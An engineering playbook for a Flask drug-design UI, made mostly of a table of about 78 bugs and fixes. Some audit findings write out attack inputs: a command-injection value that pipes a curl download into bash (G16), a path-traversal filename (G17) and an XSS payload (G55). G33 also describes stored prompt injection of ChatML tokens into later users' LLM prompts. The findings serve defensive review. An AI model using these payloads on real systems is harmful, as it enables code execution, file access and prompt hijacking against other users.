# Elion UI — Distillation Playbook

**What this is.** A build spec for the **Elion UI**: a single-process Flask platform that fronts the Elion
drug-design stack with four interactive visualizers — GPU docking (AutoDock Vina-GPU), a ChemBERT
per-atom weight view, a DeepAtom saliency view, and a live Thompson-Sampling monitor — all tied together
by a RAG-powered *UI action router* that turns natural language typed into a mini-chat into a concrete
button highlight. It is written so a *fresh session on a new platform* can rebuild every feature quickly —
each section gives the **goal**, the **approach/algorithm**, the **key parameters**, the **gotchas that
cost real debugging time**, and **how to verify**.

**Substrate assumption.** Python 3.10, Flask 3 (dev server), PyTorch, RDKit, FAISS + sentence-transformers,
a llama.cpp/OpenAI-compatible LLM server, and vanilla browser JS with Plotly for all 3-D and charting.
The *architecture* is framework-agnostic; the gotchas marked `[FLASK]`, `[SSE]`, `[PLOTLY]` and `[OPENCL]`
are specific to those substrates and are the traps most likely to burn a reimplementation.

**How to read it.** Start with §0 (the gotcha quick-reference — the highest-value page). Then build in
the order of §1→§18; later features depend on earlier contracts. Constants are collected in the Appendix.

> **Scope note.** This playbook describes the code **as shipped**. A meaningful fraction of it does not
> run: six module-level `NameError`s dead-fail live endpoints, an assignment that shadows a config path
> reduces a three-protein library to one, and several frontend buttons call functions that exist only in
> a template no route renders. Those are documented rather than elided, because in every case the *reason*
> the bug survived is the reusable lesson — and because the shipped `tests/` suite passes on a tree that
> cannot dock a single ligand.

> **The one-line summary of every hard bug below:** this app has no isolation boundaries. One global
> `app`, one global queue, one global log file, one global chat history, one mutable `app.config` — and
> `threaded=True`. Everything in §4 follows from that, and so does half of §0.

> **v2 note — read G67 before anything else: there are two trees and they moved in opposite
> directions.** The *packaged* tree (`UI/` + `uiapp/`, everything in §1–§18) has the env-var config
> module, the repo-relative path helper and the dependency-free structural test. The *feature* tree
> (`visualizer/` + `nas_storage_app/`) has five subsystems the packaged one does not — and hardcodes
> every path to one developer's home directory, which is precisely what the packaged tree's own test
> forbids. A merge has to take **features from one and packaging from the other**; taking either wholesale
> loses something real.
>
> **§19 ⧉ Sessions** — SQLite-backed chat history, plus a model registry. The schema is fine; the
> identity is the **client IP read from `X-Forwarded-For`** (**G69**), and the concurrency story is three
> different connection strategies in one file with no WAL and every error swallowed (**G70**).
>
> **§20 ✎ Unified mini-chat and consolidated CoT** — the three near-duplicate per-tool chat endpoints
> collapse to one generator, and the four copy-pasted chain-of-thought routers collapse to one module.
> Both consolidations are **partial**, and the leftovers are the interesting part: the two surviving
> routers emit **different action strings for the same intent** (**G76**), and the history clear is a
> no-op for the streaming path for a reason that is worth understanding once (**G71**).
>
> **§21 ⬢ Pose generation** — the largest new feature: SMILES → 3-D conformer + torsion tree server-side,
> all kinematics in the browser, three scoring backends and a pure-Python reimplementation of the docking
> score function. It ships a standalone template that **cannot parse** (**G82**), and a client-side
> constant that mirrors a server threshold with no agreement check.
>
> **§22 ⟐ The TS frontend, split seven ways** — one file became seven, and the genuinely valuable change
> is invisible in the file listing: **statistical authority moved to the backend** so a live chart and a
> reloaded chart are byte-identical (**G89**). That is the pattern to copy.
>
> **§23 ⌁ Two tools removed, one button kept** — the Get Ligand Center calculator and the second LLM
> gateway (an offline reasoning pipeline, statically divided from the in-app chat model) are **not
> shipped**; the Reasoning *button* survives as a plain external link. The section is here because the
> removals are the reusable part: how to cut a vertical slice cleanly, and how the near-miss identifier
> `ligCenter` (pose-frame geometry, unrelated, **must not be touched**) makes a careless grep destructive
> (**G85**).
>
> **The renderer collision from G49 was "fixed" — by locking the global — and the fix is strictly worse
> than the bug. See G68.** It is the single highest-severity finding in this drop.
>
> **And read G92 before you debug a 404 in this app.** Two TS endpoints answer 404 for a *configuration*
> problem, the client discards the explanatory body, and the reaction picker's absence is the only other
> symptom — so a wrong engine path is indistinguishable from an unregistered route.

---

## 0. Gotcha quick-reference (read this first)

| # | Trap | Right answer |
|---|---|---|
| **G1** | **A live endpoint 500s with `name 'math' is not defined` — after a multi-minute docking run has already burned** | Six module-level `NameError`s ship in the route layer: `math` (docking energy decomposition), `Chem` (**every** 3-D payload request, valid SMILES included), `Path` (all four fine-tune / prepare endpoints), `_detect_emotion` (the entire docking chat stream), plus four undefined names inside a dead copy-pasted router. None is caught by the shipped tests, because those tests deliberately avoid importing the heavy stack. **`python -m pyflakes uiapp/routes/*.py` finds all six in under a second — put it in CI.** A dependency-free structural test and a static undefined-name pass are complements, not alternatives. |
| **G2** | **The protein library collapses to one entry, and only one subsystem notices** | A module imports the correct `_INPUT_ROUTES_YML` from the shared module and then **overwrites it two lines later** with a path that does not exist. The YAML read fails, is caught, and falls through to a synthetic single-entry fallback built from `app.config` — which has no `id` key, so the selector 404s for every real protein id. A sibling module passes the *correct* constant into another subsystem, which reads all its datasets fine — a direct A/B proof. Never re-derive a constant you already imported. |
| **G3** `[FLASK]` | **Two browser tabs receive a random half of each other's docking output** | One process-global `queue.Queue` carries all docking progress, and every run **drains it** at start — deleting the first job's in-flight output. Every SSE consumer competes via `q.get()`. Same shape for the single fixed log path (concurrent runs truncate each other) and the single global chat history (users see each other's turns). Key everything by `job_id`: `dict[str, Queue]`, per-job log under a temp dir, session-keyed history. |
| **G4** | **A `chat/clear` endpoint reports success and clears nothing** | `global _attn_chat_history; _attn_chat_history = []` — but the name was bound by `from … import _attn_chat_history`. Rebinding the local name leaves the *original object*, which every other holder reads, untouched. **Mutate, don't rebind**: `_attn_chat_history.clear()`. |
| **G5** | **A model is loaded twice onto the same GPU and one copy is thrown away** | The path-keyed model cache is a bare `dict` with **no lock**, under `threaded=True`. Two concurrent cold requests both miss, both allocate a full 8-layer/1024-dim model on `cuda:0`, one result is discarded. On a tight GPU that is an OOM. The neighbouring job registry *does* use a lock; the cache uses nothing. |
| G6 | The model cache grows without bound | `model_path` is **client-controlled**. A client can enumerate checkpoints and pin one model per path, with no eviction and no size cap. Whitelist the path against the known presets. |
| **G7** `[FLASK]` | **`debug=True` on `0.0.0.0` costs you three separate things** | (1) The Werkzeug interactive debugger is exposed on every interface — a PIN-gated RCE console on any traceback page. (2) The reloader forks, so **all module-level state exists twice** and every `FileHandler` opens its log twice (visible as duplicated lines). (3) `threaded=True` on the dev server is one OS thread per request with **no cap** — 50 concurrent docks means 50 Vina processes each at `--cpu os.cpu_count()`. Ship gunicorn/waitress with `debug=False`. |
| **G8** | **The threading in the docking handler is decorative** | `t = Thread(...); t.start(); t.join(); proc.wait()` — `join()` immediately after `start()` is a synchronous call. The request blocks for the whole run, so behind nginx (60 s default `proxy_read_timeout`) the client gets 504 while the dock keeps running and writes its output. The correct pattern already exists **twice in the same codebase**: `POST` → `{status:"started", job_id}`, daemon thread, SSE progress. Use it for the three synchronous handlers (dock, DeepAtom estimate, PDB conversion). |
| **G9** | **`if line[:4] not in ("ATOM","HEAT")` — the PDBQT parser silently drops every HETATM** | `"HETATM"[:4]` is `"HETA"`, not `"HEAT"` — the letters are transposed, and the typo appears **twice**. This is worse than data loss: the receptor loader's whole contract is that its running index must equal the docking engine's atom position, and the counter only increments for lines that pass the filter. Any receptor with cofactors, metals or waters — including everything the app's own converter emits, which preserves `HETATM` verbatim — shifts **every subsequent index**, so the UI labels interactions against the **wrong residue**, silently. Match on `line[:6] in ("ATOM  ", "HETATM")`. |
| **G10** | **The "attention visualizer" shows no attention, and its output does not depend on the molecule** | The value plotted is `Adjacency_embedding.weight_a` — a **static 256-float learned parameter** indexed by sequence position. No forward pass, no layer, no head, no SMILES dependence. The SMILES is used *only* to get an atom count for the slice `w[1 : n+1]`. Two different molecules with the same atom count return **byte-identical** vectors. Worse, the slice maps *sequence position* → *atom index*, but the tokenizer is **per character**, so for anything with brackets, ring digits or bond symbols the mapping is wrong beyond the first few atoms. If you want attention, request it: `nn.TransformerEncoder` is called without `need_weights` and no hooks are registered. |
| G11 | Two views use inverted colour scales for the same visual channel | The docking payload states the rule explicitly ("Vina scores: lower is better, so we INVERT") and implements `norm = (max_e − e)/rng`; the ChemBERT payload uses `norm = (v − vmin)/(vmax − vmin)`. Different quantities, same `_coolwarm_hex` ramp, same `atoms[i].color` field, rendered identically. Carry an explicit `"scale_direction"` in the payload. |
| G12 | The "most important atoms" list promotes the *worst* atom | Both top-K selections rank by `abs(value)`, mixing strongly-favourable and strongly-unfavourable atoms into one list. Harmless while values are almost all ≤ 0; wrong the moment an atom carries a large positive out-of-bounds penalty. |
| **G13** | **`best_affinity` can be scraped from a coordinate dump** | `re.search(r'^\s*1\s+([-\d.]+)')` **breaks on the first match anywhere in the log**, not inside the mode table. Any earlier line beginning with whitespace-`1`-whitespace-digits yields a wrong, possibly positive, affinity reported as the docking result. A second endpoint runs the same regex with `re.MULTILINE` over the whole text, so **the two endpoints can disagree about the same run**. Anchor the search inside the extracted mode table. |
| **G14** `[SSE]` | **An SSE generator that only exits on a sentinel leaks a thread forever** | `while True: line = q.get(timeout=30); if line == "__DONE__": break; except Empty: yield keep-alive`. The worker pushes the sentinel on both the success and exception paths — but a hard kill (OOM-killer, SIGKILL) leaves the generator emitting a keep-alive every 30 s for the life of the process, holding a thread and a queue. One endpoint in the same file gets it right with an `idle < 60` counter. Add a wall-clock deadline **and** a `job["status"] in ("done","error")` check. |
| G15 | Job dicts and queues are never freed | Nothing ever deletes a completed job from the registries. Reads are also unlocked (safe under the GIL for individual dict ops, but a reader can still see a half-populated job). Add a TTL reaper keyed on completion time. |
| **G16** | **`shell=True` with an unvalidated request field is remote code execution** | One handler interpolates `test_type` — straight from the request JSON, unvalidated and unquoted — into a bash string. `{"test_type": "vs; curl http://x | bash"}` runs as the server user. Whitelist it against the three legal values and use an argv list. Two sibling modules do exactly that and are safe; this is a one-file regression. |
| **G17** | **File upload has no `secure_filename`** | The only check is `filename.lower().endswith('.pdb')`, which a traversal payload like `../../../<any-writable-dir>/payload.pdb` satisfies — and `os.path.join` with a leading `..` component escapes the temp directory on save. Separately, a form field `out_dir` is passed straight to `os.makedirs(..., exist_ok=True)`, letting a client create any directory and drop a file in it. And several JSON endpoints accept absolute paths and read (or `mkdir -p` + write) with no sandbox — one of them is a clean filesystem oracle (`{"exists": true, "n_atoms": 0}` distinguishes any readable path). Resolve every client-supplied path against a fixed allow-list root. |
| G18 | Error responses ship server internals to the browser | Every handler ends `return jsonify({'status':'error','message': str(exc)}), 500`. In practice that currently ships `"name 'math' is not defined"` and, for `FileNotFoundError`, full absolute server paths; one endpoint returns 1000 chars of raw stderr **and** stdout. Log the detail, return a correlation id. |
| G19 | A bare `except:` swallows Ctrl-C | The progress-queue drain loop uses `except:` — which catches `KeyboardInterrupt` and `SystemExit` — and is an `empty()`/`get_nowait()` TOCTOU that can spin. Nearby, `except Exception` turns an unreadable or malformed PDBQT into an **empty atom list**, so a corrupt file surfaces as `{"exists": true, "n_atoms": 0}` rather than an error, and a broken checkpoint becomes indistinguishable from an untrained one. |
| **G20** | **Env vars must be set BEFORE the app import, and the file says so** | Every path constant in the config module is evaluated **at module import**, and torch/vLLM/NCCL read their tunables at *their* import. The entry point therefore sets ~15 environment variables and only then does `from uiapp import app`. Move a heavy import above that line, or set an env var from inside a request handler, and it silently has no effect — you get two different cache directories in one process and 13 no-op NCCL settings. |
| G21 | The launcher's `cd` is load-bearing for imports, not just paths | There is no `setup.py`/`pyproject.toml`, so the package is importable **only** because the launcher `cd`s to the repo root and CWD lands on `sys.path[0]`. Repo-relative *data* paths are fine — they go through a `resolve()` helper anchored on `__file__` — but any WSGI server needs an explicit `PYTHONPATH`. |
| **G22** | **A config section is loaded, resolved, printed in the startup banner — and never used** | The docking binary and log path are read from the YAML, absolutised, and echoed at boot; the actual command is built from *different* constants in the config module. Editing the YAML changes only the banner. Meanwhile the *entire* second top-level YAML section is discarded at load (only one subtree is kept), so that subsystem's paths are never absolutised and are evaluated against the process CWD at request time. |
| G23 | "Zero hardcoding allowed" — and the hardcoded fallbacks are what actually run | The YAML header says it; the handlers then hardcode the full docking box as `.get()` defaults. Because the per-protein entries live *inside* a list that G2 makes unreachable, and the top level has no box keys, those code-level constants are the effective parameters. Splice the active entry into the top level at load. |
| **G24** | **The configured binary does not exist, and the flags are for a different program** | The config points at `engines/vina/vina`; the directory contains an extensionless ELF, two Windows `.exe`s, and two PTX caches — no `vina`. Even after fixing the name, the handler passes `--exhaustiveness` and `--cpu`, **neither of which the GPU binary accepts** (`strings | grep -ic exhaustiveness` → 0), and omits `--thread`, which is **mandatory**. The CPU-Vina CLI and the GPU-Vina CLI are not interchangeable: `--thread` replaces exhaustiveness, `--search_depth` replaces the MC step count. Also the ELF ships mode `0644` — `chmod +x` before anything works. |
| **G25** `[OPENCL]` | **A precompiled kernel cache silently targets one GPU generation** | The `.bin` files are **PTX text**, not machine code, with `.target sm_89` in the header. PTX JIT is forward-compatible but **not backward**: on an older architecture the build fails and the error handler calls `exit(-1)`, so the child dies with no usable message. **Fix: delete both `.bin` files — the binary recompiles from the `.cl` sources and re-saves them for the local device.** Related: the writer loops over all devices concatenating binaries into one file while the reader reads the whole file as one binary for one device, so a multi-GPU context silently produces a corrupt cache. |
| G26 | The Windows `.exe`s are inert, and the extensionless file is the real binary | No wine, no subprocess reference. They are MSVC builds of an older version with the developer's source tree baked in. One of them is the *kernel builder* (it alone contains `clCreateProgramWithSource`) and the other is a cache-only consumer; the Linux ELF contains **both** paths, so it self-heals on a cache miss. |
| G27 | Two shell scripts in one directory need two different working directories | One expects `docking_score/...` (run from the engine dir), the other expects `LGBM_suzuki/...` (run from `engine/docking_score`). Neither has `set -e`, so a missing input directory makes the glob literal, the loop body never runs, and the script prints `Done!` over a header-only CSV with exit 0. The plotting script then catches `FileNotFoundError` and **also exits 0**. |
| G28 | A rename that is a documented no-op | `merged_df[['SMILES','Affinity']].rename(columns={'score':'LABELS'})` — there is no `score` column; the header stays `SMILES,Affinity`. It only *appears* to work because both downstream readers rename positionally (`names=['SMILES','LABELS']`). The comments describe a third set of column names. Rename by position or by name, not both. |
| G29 | The iteration index is hardcoded in five files and is already inconsistent | Four scripts say `3`, one says `4`. Every active-learning round requires hand-editing all of them. And the pipeline's relative paths (`../vina/…`) assume a directory layout the repo re-org already broke. |
| **G30** | **The RAG index is correct — the *query* normalisation is not, and it will break the day anyone batches** | Documents are normalised per row (`axis=1, keepdims=True`) before going into an inner-product index — so IP genuinely is cosine, and the classic bug is **not** live. But the query path uses `np.linalg.norm(q_vec)` with **no axis**: identical for one row, and for a batch it divides every row by the Frobenius norm of the whole matrix, shrinking every similarity below the threshold and silently degrading to the keyword fallback. Normalise both sides the same way. |
| **G31** | **The auto-learner poisons the live index with greetings, and the shipped artifacts prove it** | The prompt explicitly says "set matched=false for greetings (hi, hello)"; the model returned `matched=true` anyway, and the persisted KB now maps a help button to triggers `hello`, `hi`, `what's next?`, `I'm stuck`. Those hot-injected vectors then **outrank curated entries** at cosine ≈ 1.0. There is no provenance weighting and no confidence discount — `route()` treats all records identically. Keep learned records out of the ranked pool until a human promotes them, or penalise them and raise their threshold. |
| **G32** | **The same user message routes differently before and after a restart** | Dedup against the main KB is `btnId in content **or** action in content` (OR, not AND), so an entry pointing at an already-used button is never written to disk — but the **hot-inject runs unconditionally, outside both dedup checks**, and the index is never re-saved. So the vectors exist in RAM only, the KB file's mtime is unchanged, and the next process start reloads the cached index without them. Gate the injection on a successful write, and persist. |
| **G33** | **User text reaches a later user's LLM prompt verbatim — stored prompt injection** | The raw user message is force-inserted as trigger #1 of a learned entry → written into the shadow KB → that exact file is read by a chat route → interpolated raw into a routing prompt. A message containing `<|im_end|><|im_start|>system …` is persisted and replayed into **every subsequent user's** prompt. Strip ChatML control tokens before persisting, and fence the KB block. |
| **G34** | **The reply parser rejects well-formed JSON, and the shipped log proves it** | `re.search(r"<output>(.*?)</output>", raw, re.DOTALL)` → `None` → learning aborts. The captured run shows the model emitting perfect JSON with **no tags at all** and the log line `ERROR: no <output> block`. The same regex also fails on a fenced block inside the tags, and `max_tokens=600` routinely truncates a `<think>` block plus 8–10 triggers before the closing tag. Try the tag, then a fence strip, then a brace-balanced scan; and size the budget to the worst case. (The *other* JSON parser in the codebase, `findall(r'\{[^{}]+\}')` + last match, survives fences but breaks on any nested object — the two failure modes are complementary.) |
| G35 | A `reload()` that reloads nothing | The "force-rebuild index" helper calls the loader, whose first act is the mtime check — so if no KB file changed it reloads the stale cache and rebuilds nothing. Delete the index files or pass a `force` flag past the gate. |
| G36 | The KB parser has four undocumented constraints | `**response:**` is captured with `(.+)`, so it is **single-line only** — a wrapped response silently loses everything after the first newline. Any `**`-prefixed line **terminates the trigger block**, so field order is mandatory. The template file is excluded by *exact basename*, so a copy named `template.md` gets indexed with btnIds that do not exist in the DOM. And the mtime glob **includes** the template, so touching it forces a rebuild that changes nothing. |
| G37 | The retrieval `k` is applied before the tool filter | `k = min(top_k*6, N)` neighbours are fetched, *then* filtered by tool hint. If all of them belong to the other tool, the candidate list is empty and the router drops to the keyword fallback rather than looking deeper. Reachable for tool-specific jargon in a two-tool corpus. |
| G38 | The tool name changes when a record round-trips through disk | The KB says `attention_visualization`; the hot-inject writes `attn_visualization`. Both pass the (substring-and-special-case) tool matcher today, so nothing breaks — until anyone adds an exact match. |
| **G39** | **A caller-supplied `stop` list silently removes the ChatML terminators** | `"stop": p.stop or ["<|im_end|>", "<|endoftext|>"]` — `or` **replaces** rather than extends, so any custom stop sequence removes the terminators and the model runs to `max_tokens`, emitting the literal control token into the response body. Concatenate, don't alternate. |
| G40 | A preset requests exactly the whole context window | One sampling preset sets `max_tokens=8192` against a server started with `--n_ctx 8192`. Prompt tokens count against the same window, so any non-empty prompt overflows; llama.cpp either errors or silently truncates the prompt. Also the model alias advertised by the server (`qwen2.5-14b`) does not match the weights it loads by default (a 7B GGUF). |
| G41 | A global lock is acquired synchronously inside an async streaming handler | `with _lock:` around a **blocking** generation loop inside an `async def`. The second concurrent request blocks the event-loop thread on `Lock.acquire()`, stalling *every* endpoint including `/health`. Run generation in a worker thread and use an `asyncio` primitive. |
| **G42** | **A converter reports success while producing an empty file** | The exit code *is* checked; **emptiness is not**. Open Babel exits 0 while writing an atom-less PDBQT when it cannot perceive the molecule; the sanitizer then filters everything, and the route returns `{"status":"success", "pdbqt_text": ""}`. Vina later reports affinity `None` with no explanation. Assert ≥ 1 `ATOM`/`HETATM` line survives sanitisation, on both paths. |
| **G43** | **The fallback converter docks every ligand rigid** | The RDKit path emits `ROOT` / atoms / `ENDROOT` / **`TORSDOF 0`** — no rotatable-bond detection, no `BRANCH` records. Whenever Open Babel is absent, every ligand docks fully rigid in its input conformation. Vina runs, converges, and returns a plausible number, so the failure is silent and scientifically severe. |
| G44 | The receptor keeps its waters, ions and co-crystallised ligand | The receptor allow-list is `ATOM/HETATM/TER/END` with **no** `HOH`/`WAT` filter anywhere on the conversion path (the only water filter in the file belongs to a different endpoint). Everything becomes rigid receptor atoms occupying the binding site. |
| G45 | Three different PDBQT column layouts in one file | The receptor writer puts the charge at 66–74 and the type at 76–77; the ligand writer puts them at 70–77 and 79–80; the canonical format is 70–75 and 77–78. Also all N→`NA` and O→`OA` (declaring backbone amide donors to be acceptors) and every H→`HD` (which means *polar* H). One shared writer; diff against a reference preparation tool. |
| G46 | A sanitiser exists because the tool copies junk through | Open Babel passes `TITLE`/`REMARK`/`COMPND` into the PDBQT and Vina then reports affinity `None`. The sanitiser's record allow-list is not cosmetic — it is the fix. Keep it, and keep the comment saying why. |
| G47 | Saliency discards its sign and omits the input | `sqrt((grad**2).sum(axis=0))` destroys the sign, yet the docstring advertises the value as analogous to a per-atom energy — which is signed, favourable-negative. Any diverging colormap driven by it is meaningless. And a raw gradient on a sparse occupancy grid is non-zero at **empty** voxels, so an atom in an unoccupied voxel scores high. Use `(grad * x).sum(axis=0)` for a signed, occupancy-weighted attribution and label the two fields differently. |
| G48 | Out-of-box atoms are silently clamped onto the boundary | `vi = max(0, min(N-1, vi))` hides an origin mismatch: when the grid file carries no origin key it is *derived* from the atom bounding box, which is not the point the grid writer centred on. Every misplaced atom inherits a boundary voxel's importance. Raise on out-of-range, and treat a missing origin as a hard error. Also: two code paths in the same request read the grid array by different key-priority rules, so the reported score can come from a different array than the atoms did. |
| **G49** `[PLOTLY]` | **Visualising a second molecule with the same heavy-atom count shows the first molecule's geometry** | A later-loading script re-declares the renderer and wins by script order. Its reuse fast-path keys on `_fullData[1].x.length === atoms.length` and then **restyles colour and size only — never `x/y/z`, never the bond trace**. Benzene then any other 6-heavy-atom SMILES reproduces it. Key the guard on molecule identity (a SMILES hash), and namespace renderers instead of relying on load order. |
| **G50** | **The Thompson-Sampling worker cannot be stopped, and the modal wedges permanently** | The cancel handler is attached to a **disabled** button, and a disabled button never dispatches `click`. The modal's close function only adds a CSS class: no `clearInterval`, no `es.close()`, no `worker.terminate()`. Close mid-run and the worker keeps parsing, the stream keeps flowing, and two intervals keep firing against hidden DOM for the life of the tab — then the run guard refuses to restart. Keep the button enabled and swap its handler; make close call cancel. |
| G51 | The docking streams and their floating terminal survive the modal close | Both `EventSource`s are declared **function-locally** inside the start handler and closed only from the POST's `.then`/`.catch`. The close handler touches neither, and the progress panel is appended to `document.body` at a high z-index — so it floats over the bare page after the modal is gone. Hoist the handles to module scope and close them on hide. |
| G52 | Two document listeners and a `<style>` leak per open/close cycle | The drag listeners and an injected stylesheet live inside the panel's `if (!panel)` construction block, but the panel's own ✕ **removes** the node — so the next open re-enters the block. Same class of leak in two highlight helpers, where each invocation adds a `stop` closure that only unbinds if the user actually clicks. Reuse the node (hide, don't remove), or store handler refs and remove them. |
| G53 | Endpoint URLs are string literals in eight files, and one of them 404s | 27 hardcoded URLs with no shared constants module; one (`/hub/upload_pdbqt`) has **no Flask rule at all**, so every attachment upload 404s into a swallowed `.catch`. A ligand-center tool writes into input ids that do not exist in any template, so it always reports "could not locate the fields". Emit the URL map from the server, or use `url_for` everywhere. |
| G54 | Modal state survives close and corrupts the next open | A grid-box visibility flag is never reset, and the traces it added are destroyed by the next `Plotly.react` (which replaces the whole trace list) while the flag stays `true` — so the box vanishes and the next click takes the *hide* branch and removes nothing. The molecule cache, camera and view mode persist too, so reopening shows the previous run. One explicit `reset()` on hide. |
| G55 | `innerHTML` with unescaped server and file data | The chat paths escape; the data paths do not. SMILES from an uploaded CSV, PDB atom/residue fields, reagent file paths from a YAML, and worker-built HTML strings all go straight into `innerHTML`. A residue named `"><img src=x onerror=alert(1)>` executes. Build rows with `createElement` + `textContent` — one function in the same file already does. |
| G56 | The colour scale collapses to a single colour on a degenerate domain | `(v − vmin)/(vmax − vmin + 1e-8)` gives `0` for every point when all values are equal — so a one-atom SMILES, or a pose where every contact energy is identical, renders uniformly "lowest". Return `0.5` (mid-grey) when the span is below epsilon. |
| G57 | A comment says "retry once"; the code retries forever | `setTimeout(fn, 300)` inside the not-found branch, unconditionally, at 3.3 Hz. Bound the attempts or use a `MutationObserver`. |
| **G58** | **The backend emits action names the frontend has never heard of, and nothing errors** | Seven action strings are produced by the KB or the routing allow-lists with **no handler**; two handlers exist for actions **nothing produces**; and the KB's `btnId` values name elements that do not exist in the DOM — harmless only because the frontend ignores `btnId` entirely and re-derives the element from its own map. The dispatcher's fallback is `if (!entry) return;` — a silent no-op. **One test — "every action string in the KB and both allow-lists is a key of the frontend action map, and every btnId resolves to a real element id" — would have caught the entire drift table.** |
| G59 | A modal's backdrop closes a *different* modal | `onclick="if(event.target.id==='vinaModal')_adjHide()"` — a copy-paste that leaves the outside-click path doing nothing visible. Two global `Cmd/Ctrl+K` handlers with different behaviours are registered on `document` for the same reason, and one button ends up with two click handlers so its show function runs twice per click. |
| G60 | Three buttons call functions that exist only in a template no route renders | The dead template is the sole home of the voxel-inspector code the live page calls, and one referenced function exists nowhere in the repo. Clicking throws `ReferenceError`; one of the calls is inside a promise, so it surfaces as an unhandled rejection on every protein render. Grep for `render_template` to find which templates are actually reachable before trusting any of them. |
| G61 | A `.smi` file that is really a CSV | The shipped sample data carries a `SMILES,LABELS` header and comma-separated fields despite the extension. A whitespace-splitting reader ingests the literal string `SMILES,LABELS` as molecule #1. |
| G62 | Files the code needs are gitignored | The shadow KBs, the model checkpoints (`*.pt`), the sentence-transformer encoder and the FAISS index are all absent from a clean clone — some of them shipped only in the archive. The CoT routers `open()` them inside `try/except → None`, so the feature silently degrades with no error surfaced. Make missing required assets a loud startup failure. |
| G63 | `TMPDIR` is hijacked into the repo, and one temp dir is never cleaned | The entry point **force-assigns** `TMPDIR`/`TEMP`/`TMP` to a directory inside the repo, so every `tempfile.mkdtemp` in the app writes there. One caller cleans up in a `finally`; the other never does, accumulating a patched YAML directory per run. |
| G64 | Half a 613-line module is a verbatim duplicate of its own first half | Seven names are defined **twice**, second definition winning — and the second copies **shadow the config-driven, env-overridable paths** with hardcoded sibling-repo literals. Two route modules are near-verbatim copies of each other with **two independent job registries**, so a job started on one prefix 404s on the other. Three parameters are accepted, validated, stored, and never passed to the subprocess. |
| G65 | A cached KB is read once forever while another module writes to it at runtime | Learned entries are invisible to the chain-of-thought router until a restart. Invalidate on mtime, or share the loader with the index builder that already does. |
| G66 | `.get(key, default)` returns `None`, not the default, for an explicit `null` | `_ctx.get('receptor_path', '').strip()` raises `AttributeError` when the client sends `{"receptor_path": null}`. Use `(_ctx.get(k) or '')`. |
| **G67** | **Two trees, opposite directions of travel — do not merge either wholesale** | The packaged tree has a config module with ~16 env overrides, a `resolve()` helper anchored on `__file__`, and a structural test that forbids `/home/<user>` paths. The feature tree has five subsystems the packaged one lacks — and **41+ hardcoded `/home/<user>` paths**, a config module with **zero** env overrides and bare relative string literals resolved against CWD, and two config modules that are unimportable as written (one imports a filename that does not exist on disk). Take the features from the feature tree and the packaging from the packaged tree, and port the structural test **first** so the merge cannot regress. |
| **G68** | **A global-name collision "fixed" with `Object.defineProperty` turns a silent wrong-render into a total feature failure** | Two scripts declared the same three renderer functions; the later one won by load order. The fix applied was to lock the global: `defineProperty(window, '_renderTable', {writable:false, configurable:false})`. Per the spec, a classic script containing `function _renderTable(){}` calls `CanDeclareGlobalFunction`, which returns **false** for a non-configurable non-writable property → **TypeError thrown at instantiation, before any statement of that script runs**. The later script's entire body is lost: its jQuery init, its `let` bindings (which stay in TDZ, so any reader throws `ReferenceError: Cannot access X before initialization`), and a scroll helper the main chat calls **on every streamed token**. The same file also ships a double-load detector and a `(window._renderTable \|\| _renderTable)(…)` call site — evidence this was debugged repeatedly without the root cause being removed. **The only fix is one owner per global.** |
| **G69** | **Session identity is the client IP, taken from a header the client controls** | `ip = X-Forwarded-For.split(',')[0] or remote_addr or "unknown"`, and `(ip, chat_type)` is the primary key. Any client can set the header and read or write another user's chat history through the history and append endpoints. There is no session id, no cookie, no token. If you keep IP as a fallback, only trust the header behind a proxy you control, and prefer a signed session cookie. |
| **G70** | **Three SQLite connection strategies in one 358-line file, no WAL, and every error swallowed** | An import-time throwaway connection, a Flask-`g`-cached one used by exactly one route, and a fresh per-call connection in each of the three real accessors. `PRAGMA journal_mode` and `busy_timeout` appear **nowhere in the tree**, so it is the default rollback journal with a 5 s timeout under `threaded=True`. Two chat streams finishing together give `database is locked`, caught by a broad `except` → the turn is **silently lost** with only a warning. Separately, session creation is SELECT-then-INSERT against a UNIQUE index with no `INSERT OR IGNORE`, so racing the first turn of a new session drops it the same way. |
| **G71** | **`chat/clear` succeeds and the next prompt still contains the old turns** | `global _hist; _hist = []` **rebinds the name**, but a module-level map built at import time holds the **original list object** — and the streaming path reads through that map. Same defect as G4, one level of indirection deeper, and it survived the consolidation. `.clear()` the list; never rebind a name another structure already captured. |
| **G72** | **A new user's first message is built from another user's history** | `history = db_hist if db_hist else mem_hist`. On the first message from a fresh IP the DB is empty, so the prompt falls back to the **process-global in-memory list** — which holds whatever the last user said. Present at all three chat call sites. Delete the in-memory fallback, or key it per IP. |
| G73 | One chat tool can never route, and its learned entries pollute another tool's knowledge base | The tool-hint matcher has branches for two tools; a third tool's hint is not a substring of either, so **every** candidate is filtered out, retrieval always returns nothing, and the auto-learner always fires — and the learner's path resolver sends anything that is not the one named tool to the *other* tool's KB. Add the branch, or key the filter on an explicit set. |
| **G74** | **The auto-learner's OR dedup silently discarded real learning, and the shipped artifacts prove it** | `_already_in_file` returns true if **either** the btnId **or** the action already appears. Both buttons the learner picked were already present under *different* actions, so its two genuinely-new actions were written to the shadow KB (where they sit, stamped `auto-learned:`) and **never appended to the main KB** the router indexes. The index has exactly the hand-authored vector count; not one learned vector survives. Combined with an unconditional, never-persisted hot-inject, the learner is **write-only**. Make the predicate AND, gate the injection on a successful write, and persist. |
| G75 | The retrieval index never rebuilds | The staleness check is `max(mtime of KB) > mtime(index)` — a **strict** `>` — and every KB file and both index artifacts carry the identical timestamp from a bulk copy. So the comparison is `equal → no rebuild`, forever. Any edit landing in the same filesystem second as the index write is also silently ignored. Compare a content hash, or use `>=`. |
| **G76** | **Two routers, two vocabularies, same intent** | The keyword router emits `compare_mode` and `run_finetune`; the CoT router's whitelist contains `compare_molecules` and `fine_tune_model`. Whichever fires first determines the action string, and only one set has frontend handlers. This is G58 recurring *inside the backend* after the consolidation — the same class of drift, now between two files that were supposed to become one. |
| **G77** | **A documented action was deleted from the frontend and nothing errors** | `select_protein` used to POST the selection, rewrite the docking box, redraw the overlay and prefill both path fields. The new frontend has no branch and no table entry — one comment line survives. A server emitting it hits the table's `undefined` fallback and **silently does nothing**. The capability moved to a user-clicked button that no `ui_action` can reach. This is a live contract break, and it is exactly what the cross-reference test in G58 would catch. |
| G78 | The CoT consolidation left three copies behind, one of them broken | One module is now the canonical home — and the module that used to own the working file handler still carries its own logger with **no handler**, another still carries a copy referencing four undefined names, and a full pre-consolidation chat module sits on disk unloaded, still importing the session layer. The canonical module's own docstring advertises an export it does not define. Delete the fossils; an unloaded 534-line file is the thing a rebuilder mistakes for live code. |
